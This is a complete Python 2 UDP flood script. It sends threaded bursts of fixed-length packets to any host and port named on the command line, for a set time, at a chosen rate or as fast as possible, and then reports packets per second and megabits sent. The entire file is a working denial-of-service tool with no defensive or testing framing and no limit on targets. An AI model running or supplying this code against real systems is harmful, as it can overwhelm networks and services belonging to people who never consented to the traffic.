#!/usr/bin/env python
from time import sleep, time
from multiprocessing import Lock
import sys, os, socket, thread, locale
from optparse import OptionParser
locale.setlocale(locale.LC_ALL,'')

# Argument parsing
parser = OptionParser()
parser.add_option('-p', '--port', dest='port', type='int', default=80, help='UDP port to flood')
parser.add_option('-l','--length', dest='length', type='int', default=32, help='Length of each packet')
parser.add_option('-t','--threads', dest='threads', type='int', default=4, help='Number of threads to use')
parser.add_option('-r','--rate', dest='rate', type='int', default=10000, help='Target number of packets per second')
parser.add_option('-f','--flood', dest='flood', action='store_true', default=False, help='Send packets as fast as possible')
parser.add_option('-s','--seconds', dest='seconds', type='int', default=10, help='Number of seconds to perform the flood')
(options, args) = parser.parse_args()

if len(args) < 1:
	print >> sys.stderr, "Target host is required"
	sys.exit(1)

# Set other shared variables
options.host = args[0]
options.counter = 0
options.lock = Lock()
options.start = time()
options.flooding = True

# The flood function
def udpflood(host):
	global options
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((host, options.port))

	divisor = options.rate / 100
	counter = 0
	while options.flooding:
		if not options.flood and counter % divisor == 0 and counter / (time() - options.start) > options.rate / options.threads:
			continue
		
		try:
			s.send('x' * options.length)
			counter += 1
		except:
			pass

	# Update total packet count
	options.lock.acquire()
	options.counter+=counter
	options.lock.release()

# The main function
def performflood():
	# What are we going to do?
	rate = str(locale.format('%d', options.rate, 1))
	if options.flood:
		rate = "max"
	print 'Flooding %s:%s for %s seconds: %d byte packets at %s packets/sec' % (options.host, options.port, options.seconds, options.length, rate)

	# Start the threads	
	for x in range(0, options.threads):
		thread.start_new_thread(udpflood, (options.host, ))

	# Wait the requested time, then stop
	sleep(options.seconds)
	options.flooding = False
	sleep(0.25)

	# Print results
	print 'Sent %s packets/sec (%.1f mbit/sec)' % ( locale.format('%d', options.counter / options.seconds, 1), options.counter * (28 + options.length) / options.seconds * 8.0 / 1000 / 1000)


performflood()
# Force exit of any threads that refused to exit
os._exit(0)
